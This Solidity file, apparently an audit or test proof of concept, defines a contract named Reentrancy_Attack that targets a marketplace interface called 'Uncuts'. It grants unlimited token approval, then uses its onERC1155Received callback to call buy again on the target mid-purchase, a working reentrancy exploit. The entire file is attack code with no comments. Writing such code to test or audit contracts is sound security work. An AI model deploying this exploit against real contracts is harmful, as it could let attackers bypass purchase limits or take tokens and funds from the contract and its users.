// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "@openzeppelin/contracts/token/ERC1155/utils/ERC1155Holder.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface Uncuts {
    function buy(
        address to,
        address authorAddress,
        uint256 id,
        uint256 amount,
        uint256 maxSpentLimit
    ) external returns (uint256, uint256, uint256, uint256);

    function getReleaseAuthor(
        uint256 releaseId
    ) external view returns (address);
}

contract Reentrancy_Attack is ERC1155Holder {
    Uncuts public uncuts_contract;
    ERC20 public payToken;

    bool public reentrant;

    constructor(address _uncutsContract, address _payToken) {
        uncuts_contract = Uncuts(_uncutsContract);
        payToken = ERC20(_payToken);

        payToken.approve(_uncutsContract, type(uint256).max);
    }

    function buy_card(
        uint256 id,
        uint256 amount,
        uint256 maxSpentLimit
    ) external {
        address tokenAuthor = uncuts_contract.getReleaseAuthor(id);
        uncuts_contract.buy(
            address(this),
            tokenAuthor,
            id,
            amount,
            maxSpentLimit
        );
    }

    function onERC1155Received(
        address,
        address,
        uint256,
        uint256,
        bytes memory
    ) public virtual override returns (bytes4) {
        if (!reentrant) {
            reentrant = true;
            address tokenAuthor = uncuts_contract.getReleaseAuthor(1);
            uncuts_contract.buy(
                address(this),
                tokenAuthor,
                1,
                1,
                type(uint256).max
            );
        }

        return this.onERC1155Received.selector;
    }
}
